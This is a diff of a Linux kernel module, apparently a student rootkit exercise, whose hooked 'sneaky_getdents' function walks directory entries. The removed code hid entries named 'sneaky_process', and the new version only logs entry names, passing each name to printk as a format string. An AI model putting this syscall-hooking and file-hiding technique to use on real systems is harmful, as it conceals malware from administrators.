@@ -9,6 +9,7 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+MODULE_LICENSE("GPL");
 
 // ?? to make sure that the “struct linux_dirent” is interpreted correctly ??
 struct linux_dirent {
@@ -74,44 +75,50 @@ asmlinkage int sneaky_getdents (unsigned int fd,
 				struct linux_dirent *dirp,
 				unsigned int count) {
   // first call original getdents() to get all dirent structs
-  int dirent_num = sys_getdents(fd, dirp, count);
-  int examined_num = 0;
-  int skipped_num = 0;
+  int dirent_size = sys_getdents(fd, dirp, count);
+  int examined_size = 0;
+  int skipped_size = 0;
 
   printk("Get Dents!");
 
   // iterate through "dirp ",
   // skip: any dirent with filename == "sneaky_process"
   // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent
-  int i; // ??? "forbids var declaration in for loop"??
-  for (i = 0; i < (dirent_num - skipped_num);) {
-    if (strcmp(dirp[i].d_name, "sneaky_process") == 0) {
-      // ha! ISO C90 forbids mixed var declare & code !??
-      void* unexamined_start;
-      int unexamined_size;
+  int offset; // ??? "forbids var declaration in for loop"??
+  for (offset = 0; offset < (dirent_size - skipped_size);) {
+    struct linux_dirent * ptr;
+    ptr = (struct linux_dirent *) ((void*)dirp + offset);
 
-      printk("WWWWW Found!");
-      
-      skipped_num += 1;
+    printk(">>");
+    printk(ptr->d_name);
+    /* if (strcmp(dirp[i].d_name, "sneaky_process") == 0) { */
+    /*   // ha! ISO C90 forbids mixed var declare & code !?? */
+    /*   void* unexamined_start; */
+    /*   int unexamined_size; */
 
-      unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen;
-      unexamined_size = dirp[dirent_num - skipped_num].d_reclen +
-	(int)((void*)(&dirp[dirent_num - skipped_num]) - unexamined_start);
+    /*   printk("WWWWW Found!"); */
+      
+    /*   skipped_num += 1; */
 
-      memmove((void*)(&dirp[i]),
-	      unexamined_start,
-	      unexamined_size);
-      // i stays the same here, do not update!
+    /*   unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen; */
+    /*   unexamined_size = dirp[dirent_num - skipped_num].d_reclen + */
+    /* 	(int)((void*)(&dirp[dirent_num - skipped_num]) - unexamined_start); */
+
+    /*   memmove((void*)(&dirp[i]), */
+    /* 	      unexamined_start, */
+    /* 	      unexamined_size); */
+    /*   // i stays the same here, do not update! */
       
-    } else {
-      examined_num += 1;
-      
-      // update i here
-      i++;
-    }
+    /* } else { */
+    /*   examined_num += 1; */
+    
+    /*   // update i here */
+    /*   i++; */
+    /* } */
+    offset += ptr->d_reclen;
   }
   
-  return dirent_num - skipped_num;
+  return dirent_size - skipped_size;
 }
 
 
